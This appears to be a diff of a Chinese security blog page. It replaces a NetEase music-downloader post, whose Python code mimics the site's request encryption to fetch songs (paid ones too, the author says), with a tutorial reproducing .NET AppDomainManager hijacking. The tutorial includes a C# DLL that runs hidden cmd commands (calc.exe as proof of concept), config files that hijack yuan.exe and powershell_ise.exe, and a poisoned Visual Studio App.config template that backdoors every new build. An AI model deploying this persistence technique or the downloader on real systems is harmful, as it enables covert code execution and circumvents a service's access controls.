@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Netease cloud music download | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Netease cloud music download | 九世的博客">
+  <title>.NET程序劫持 | 九世的博客</title>
+  <meta name="keywords" content=" 后门 ">
+  <meta name="description" content=".NET程序劫持 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1244,9 +1244,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Netease-cloud-music-download" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-NET程序劫持" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Netease cloud music download</h1>
+        <h1 class="article-title">.NET程序劫持</h1>
     
     <div class="article-meta">
         
@@ -1255,14 +1255,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">后门</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-02-12 14:11</time>
+        创建时间:<time class="date" title="更新时间: 2020-01-13 21:47:45">2020-01-13 21:07</time>
         
     </div>
     <div class="article-meta">
@@ -1284,7 +1284,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#目录"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码"><span class="toc-text">代码</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01实验过程"><span class="toc-text">0x01实验过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1299,264 +1299,124 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><hr>
-<ul>
-<li>前言</li>
-<li>思路</li>
-<li>代码</li>
-</ul>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>想写个能下载网易云歌曲的那种东西来逗逗女孩子开心，当然付费的那种也行。就是抓了某个网易云某接口吧，不知道是不是。朋友先写点后来瞎翻东西的时候看到的，后面也自己也写了一个单是反现之前那个太烂了。果断重写<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181011/7d14bd14a8074bfb8fed5e78d6603510.jpeg" alt="7d14bd14a8074bfb8fed5e78d6603510.jpeg"></p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><hr>
-<p>由于那个接口下载歌曲要获取歌曲的ID才能下载，类似于以下这样：<br>（拿全职猎人的departure这首歌的URL来说，url后面的id就是歌曲下载的id）</p>
-<pre><code>全职猎人departure!：https://music.163.com/#/song?id=496618
-访问下载接口：http://music.163.com/song/media/outer/url?id=496618.mp3
-得到最终下载地址：http://m10.music.126.net/20190212143936/506150fe805d1a57e81122e0f2e2bf00/ymusic/973f/38a2/f492/d3ff0469103cdb1ecba8c4864ec2659c.mp3
-</code></pre><p>得到思路：</p>
-<pre><code>1.先写个搜索歌曲的功能，通过抓包可以看到json返回的结果里有歌曲名称和歌曲id
-2.然后在进行访问接口
-3.最终得到 完整的下载地址然后进行下载
-4.由于这个下载地址一打开就会自动放歌，添加一个试听的功能
-</code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><hr>
-<p>PS：解密脚本，由于网易云搜索是有加密的，这里我看了半天看不懂直接CV别人的来用了<br>分析网易云音乐加密文章来源：<br><a href="https://zhuanlan.zhihu.com/p/34114167" target="_blank" rel="noopener">网易云音乐Ajax Post参数加密方法 - 知乎</a><br><a href="http://link.zhihu.com/?target=https%3A//github.com/leo0309/wangyiyunMusicAjaxAnalysis" target="_blank" rel="noopener">netEaseMuiscEncrypot.py来源</a></p>
-<p>netEaseMuiscEncrypot.py</p>
-<pre><code class="python">import json
-from Crypto.Cipher import AES
-import base64
-from Crypto.PublicKey import RSA
-import codecs
-import random
-#PKCS_7方式进行补位
-def pad(data:bytes,blockbytes:int=16):
-    &quot;&quot;&quot;
-    data:需要补位的bytes
-    blockbytes:块bytes大小
-    &quot;&quot;&quot;
-    _data = data
-    #判断是否是字符串，如果是则按utf8编码为bytes
-    if isinstance(_data,str):
-        _data = _data.encode(&#39;utf8&#39;)
-    length = len(_data)
-    pad_length = blockbytes - length % blockbytes
-    padding = (chr(pad_length)*pad_length).encode(&#39;utf8&#39;)
-    _data += padding
-    return _data
+        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>翻了翻收集的资源，打算学习一波。翻到三好学生的.NET劫持操作，复现一波<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1578931405684&amp;di=878960c7f869a877008253f25bad9396&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201608%2F28%2F20160828175529_vVwaM.png" alt=""></p>
+<h2 id="0x01实验过程"><a href="#0x01实验过程" class="headerlink" title="0x01实验过程"></a>0x01实验过程</h2><p>创建一个简单的C#程序</p>
+<pre><code class="C#">using System;
 
-#dict序列化
-def dictSerialize(data:dict):
-    if not isinstance(data,dict):
-        _data = dict(data)
-    _data = data
-    _data = json.dumps(_data,ensure_ascii=False)
-    return _data
-
-#生成随机值用于AES第二阶段加密的密钥
-def rand_a(a=16):
-    b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;
-    c = &quot;&quot;
-    length = len(b)
-    for _ in range(a):
-        c += b[int(random.random()*length)]
-    return c
-
-#aes加密
-def aes_encrypt(data,key,iv,mode=AES.MODE_CBC):
-    &quot;&quot;&quot;
-    data:明文
-    key:密钥
-    iv:偏移量
-    mode:模式，默认为CBC模式
-    &quot;&quot;&quot;
-    encryptor=AES.new(key.encode(&#39;utf-8&#39;),mode=mode,IV=iv.encode(&#39;utf-8&#39;))
-    #补位操作
-    _data = pad(data,16)
-    encrypted_data = encryptor.encrypt(_data)
-    return base64.b64encode(encrypted_data)
-
-#aes解密
-def aes_decrypt(data,key,iv,mode=AES.MODE_CBC):
-    &quot;&quot;&quot;
-    data:密文
-    key:密钥
-    iv:偏移量
-    mode:模式，默认为CBC模式
-    &quot;&quot;&quot;
-    decryptor = AES.new(key,mode=mode,IV=iv)
-    return decryptor.decrypt(data)
-
-def netEase_AES_encrypt(data,key1,key2,iv,mode=AES.MODE_CBC):
-    &quot;&quot;&quot;
-    data:明文
-    key1:第一阶段密钥
-    key2:第二阶段密钥
-    iv:偏移量
-    mode:模式，默认为CBC模式
-    &quot;&quot;&quot;
-    if isinstance(data,dict):
-        _data = dictSerialize(data)
-    _data = str(data)
-    _encryptedData = aes_encrypt(_data,key1,iv,mode)
-    _encryptedData = aes_encrypt(_encryptedData,key2,iv,mode)
-    return _encryptedData.decode(&#39;utf8&#39;)
-
-def netEase_AES_decryot(data,key1,key2,iv,mode=AES.MODE_CBC):
-    &quot;&quot;&quot;
-    data:密文
-    key1:第一阶段加密函数
-    key2:第二阶段加密函数
-    iv:偏移量
-    mode:模式，默认为CBC模式
-    &quot;&quot;&quot;
-    _data = base64.b64decode(data)
-    plaintext = aes_decrypt(_data,key2,iv,mode)
-    plaintext = base64.b64decode(plaintext)
-    plaintext = aes_decrypt(plaintext,key1,iv,mode)
-    plaintext = plaintext.decode(&#39;utf8&#39;)
-    return plaintext
-
-
-def netEase_RSA_encrypt_NoPadding(data:str,publickey:str,module:str):
-    &quot;&quot;&quot;
-    RSA采用Nopadding方式，即明文先倒排，再在前面补0
-    data:明文
-    publickey:公钥
-    module:RSA中两个大质数的乘积
-    &quot;&quot;&quot;
-    #网易云云音乐中js加密采用的算法中的参数是以16进制来操作的
-    _publickey = int(publickey,16)
-    _module = int(module,16)
-    _data = data[::-1]
-    _data = int(codecs.encode(_data.encode(&#39;utf8&#39;),&#39;hex&#39;),16)
-    #RSA加密过程
-    rs = _data**_publickey%_module
-    #返回16进制解码，前面补0补足256位的字符串
-    return format(rs,&#39;x&#39;).zfill(256)
-
-
-
+public class Program
+{
+    public static void Main()
+    {
+        Console.WriteLine(&quot;Inside the App&quot;);
+    }
+}
 </code></pre>
-<p>search.py</p>
-<pre><code class="python">#author:九世
-#time:2019/2/11
+<p>输出如下<br><img src="https://s2.ax1x.com/2020/01/13/lHhc0x.png" alt=""></p>
+<p>创建一个名为hijack.dll的dll</p>
+<pre><code class="C#">using System;
+using System.Text;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Reflection;
+using System.Runtime.Hosting;
+using System.Dynamic;
 
-import requests
-from netEaseMusicEncrypt import rand_a, netEase_AES_encrypt,netEase_RSA_encrypt_NoPadding,dictSerialize,aes_encrypt
-import webbrowser
-import os
+namespace hijack
+{
+    public class cmd {
+        private static string CmdPath = @&quot;C:\Windows\System32\cmd.exe&quot;;
+        /// &lt;summary&gt;
+        /// 执行cmd命令 返回cmd窗口显示的信息
+        /// 多命令请使用批处理命令连接符：
+        /// &lt;![CDATA[
+        /// &amp;:同时执行两个命令
+        /// |:将上一个命令的输出,作为下一个命令的输入
+        /// &amp;&amp;：当&amp;&amp;前的命令成功时,才执行&amp;&amp;后的命令
+        /// ||：当||前的命令失败时,才执行||后的命令]]&gt;
+        /// &lt;/summary&gt;
+        /// &lt;param name=&quot;cmd&quot;&gt;执行的命令&lt;/param&gt;
+        public string RunCmd(string cmd)
+        {
+            cmd = cmd.Trim().TrimEnd(&#39;&amp;&#39;) + &quot;&amp;exit&quot;;//说明：不管命令是否成功均执行exit命令，否则当调用ReadToEnd()方法时，会处于假死状态
+            using (Process p = new Process())
+            {
+                p.StartInfo.FileName = CmdPath;
+                p.StartInfo.UseShellExecute = false;        //是否使用操作系统shell启动
+                p.StartInfo.RedirectStandardInput = true;   //接受来自调用程序的输入信息
+                p.StartInfo.RedirectStandardOutput = true;  //由调用程序获取输出信息
+                p.StartInfo.RedirectStandardError = true;   //重定向标准错误输出
+                p.StartInfo.CreateNoWindow = true;          //不显示程序窗口
+                p.Start();//启动程序
 
-musica={}
+                //向cmd窗口写入命令
+                p.StandardInput.WriteLine(cmd);
+                p.StandardInput.AutoFlush = true;
 
-print(&#39;作者：By 九世&#39;)
-print(&#39;网易云音乐搜索&#39;)
-print(&#39;&#39;)
-user = input(&#39;输入你要搜索的歌手或歌曲名称：&#39;)
-query = {&quot;s&quot;: &quot;{}&quot;.format(user), &quot;limit&quot;: &quot;8&quot;, &quot;csrf_token&quot;: &quot;&quot;}
-key1 = &quot;0CoJUm6Qyw8W8jud&quot;
-iv = &quot;0102030405060708&quot;
+                //获取cmd窗口的输出信息
+                string output = p.StandardOutput.ReadToEnd();
+                p.WaitForExit();//等待程序执行完退出进程
+                p.Close();
 
-    # 公钥对，hex16进制编码
-module = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68a\
-ce615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;
-publickey = &quot;010001&quot;
-    # 序列化查询dict
-queryStr = dictSerialize(query)
-
-aaa = aes_encrypt(queryStr, key1, iv)
-    # AES加密随机量
-key2 = rand_a()
-secretStr = netEase_AES_encrypt(queryStr, key1, key2, iv)  # 加密后的params
-rsaSec = netEase_RSA_encrypt_NoPadding(key2, publickey, module)  # 加密后的key
-
-
-class Search:
-    def __init__(self,headers,url,data):
-        self.headers=headers
-        self.url=url
-        self.data=data
-
-    def reqt(self):
-        try:
-            rqt=requests.post(url=self.url,headers=self.headers,data=self.data)
-            jsons=rqt.json()
-
-            result=jsons[&#39;result&#39;]
-            songs=result[&#39;songs&#39;]
-            for s in songs:
-                print(&#39;歌曲名称：{} 下载ID：{}&#39;.format(s[&#39;name&#39;],s[&#39;id&#39;]))
-                musica[s[&#39;name&#39;]]=s[&#39;id&#39;]
-
-        except Exception as r:
-            print(&#39;[-] 报错：{}&#39;.format(r))
-            return &#39;&#39;
-        return 1
-
-    def music(self):
-        print(&#39;&#39;)
-        ids=input(&#39;请输入歌曲的名称,q退出：&#39;)
-        if ids in musica.keys():
-            print(&#39;[+] 自动打开默认浏览器，在线试听&#39;)
-            value=musica.get(ids)
-            url=&#39;http://music.163.com/song/media/outer/url?id={}&#39;.format(value)
-            webbrowser.open(url)
-        elif ids==&#39;q&#39;:
-            print(&#39;退出...&#39;)
-            exit()
-        else:
-            print(&#39;[-] 找不到歌曲&#39;)
-
-    def download(self):
-        print(&#39;&#39;)
-        ids = input(&#39;请输入歌曲的名称，q是退出：&#39;)
-        if ids in musica.keys():
-            print(&#39;[+] 下载中&#39;)
-            value = musica.get(ids)
-            url = &#39;http://music.163.com/song/media/outer/url?id={}&#39;.format(value)
-            rst=requests.get(url=url,headers=self.headers)
-            rst2=requests.get(url=rst.url,headers=self.headers)
-            xj=open(&#39;file/{}.mp3&#39;.format(ids),&#39;wb&#39;)
-            xj.write(rst2.content)
-            xj.close()
-            if os.path.exists(&#39;file/{}.mp3&#39;.format(ids)):
-                print(&#39;[+] {}.mp3  下载成功&#39;.format(ids))
-            else:
-                print(&#39;[-] {}.mp3 下载失败&#39;.format(ids))
-        elif ids==&#39;q&#39;:
-            print(&#39;退出...&#39;)
-            exit()
-        else:
-            print(&#39;[-] 找不到歌曲&#39;)
-
-
-if __name__ == &#39;__main__&#39;:
-    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#39;,&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}
-    url=&#39;http://music.163.com/weapi/search/suggest/web?csrf_token=&#39;
-    data={&#39;params&#39;:secretStr,&#39;encSecKey&#39;:rsaSec}
-    obj=Search(headers=headers,url=url,data=data)
-    rs=obj.reqt()
-    while True:
-        if rs==1:
-            print(&#39;1.自动打开浏览器试听&#39;)
-            print(&#39;2.下载&#39;)
-            print(&#39;0.退出&#39;)
-            useq=input(&#39;请选择：&#39;)
-            if useq==&#39;1&#39;:
-                while True:
-                    obj.music()
-            elif useq==&#39;2&#39;:
-                while True:
-                    obj.download()
-            elif useq==&#39;0&#39;:
-                print(&#39;退出...&#39;)
-                exit()
-            else:
-                print(&#39;[-] 没有这个选择&#39;)
+                return output;
+            }
+        }
+    }
+    public class InjectedDomainManager : AppDomainManager
+    {
+        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
+        {
+            base.InitializeNewDomain(appDomainInfo);
+            cmd f = new cmd();
+            f.RunCmd(&quot;calc.exe&quot;);
+        }
+    }
+}
 </code></pre>
-<p>最终测试结果：<br><img src="https://s2.ax1x.com/2019/02/12/kdT0ZF.png" alt="kdT0ZF.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/12/kdTyGR.md.jpg" alt="kdTyGR.md.jpg"></p>
-<p><img src="https://s2.ax1x.com/2019/02/12/kdT6R1.png" alt="kdT6R1.png"></p>
-<p>然后打包成EXE扔给她:</p>
-<pre><code>pyinstaller  -F &lt;file&gt;
-</code></pre><p>转载请声明：转自422926799.github.io</p>
+<p>修改yuan.exe.config为如下</p>
+<pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
+&lt;configuration&gt;
+    &lt;startup&gt; 
+        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;
+    &lt;/startup&gt;
+     &lt;runtime&gt;
+      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;
+      &lt;appDomainManagerAssembly
+         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;
+    &lt;/runtime&gt;
+&lt;/configuration&gt;
+</code></pre>
+<p>之后hijack.dll运行在yuan.exe前面<br><img src="https://s2.ax1x.com/2020/01/13/lH4Z34.gif" alt=""></p>
+<p><strong>尝试劫持C:\Windows\system32\WindowsPowerShell\v1.0\powershell_ise.exe</strong><br>创建powershell_ise.exe.config</p>
+<pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
+&lt;configuration&gt;
+    &lt;startup&gt; 
+        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;
+    &lt;/startup&gt;
+     &lt;runtime&gt;
+      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;
+      &lt;appDomainManagerAssembly
+         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;
+    &lt;/runtime&gt;
+&lt;/configuration&gt;
+</code></pre>
+<p><img src="https://s2.ax1x.com/2020/01/13/lH5IeI.gif" alt=""></p>
+<p>还有一个操作就是修改Vs创建C#工程时的默认App.config</p>
+<pre><code class="text">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
+&lt;configuration&gt;
+    &lt;startup&gt; 
+        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5.2&quot; /&gt;
+    &lt;/startup&gt;
+     &lt;runtime&gt;
+      &lt;appDomainManagerType value=&quot;hijack.InjectedDomainManager&quot; /&gt;
+      &lt;appDomainManagerAssembly
+         value=&quot;hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;
+    &lt;/runtime&gt;
+&lt;/configuration&gt;
+</code></pre>
+<p>编译的时候exe的config也会跟着改变<br><img src="https://s2.ax1x.com/2020/01/13/lHIB9S.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2020/01/13/lHoZ8S.gif" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/" target="_blank" rel="noopener">Use AppDomainManager to maintain persistence – 3gstudent – Good in study, attitude and health</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1566,12 +1426,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Netease cloud music download</p>
+    <p><span class="copy-title">文章标题:</span>.NET程序劫持</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-02-12, 14:11:49</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/733bcb3d.html" title="Netease cloud music download">http://422926799.github.io/posts/733bcb3d.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-13, 21:07:33</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-13, 21:47:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/576bc259.html" title=".NET程序劫持">http://422926799.github.io/posts/576bc259.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
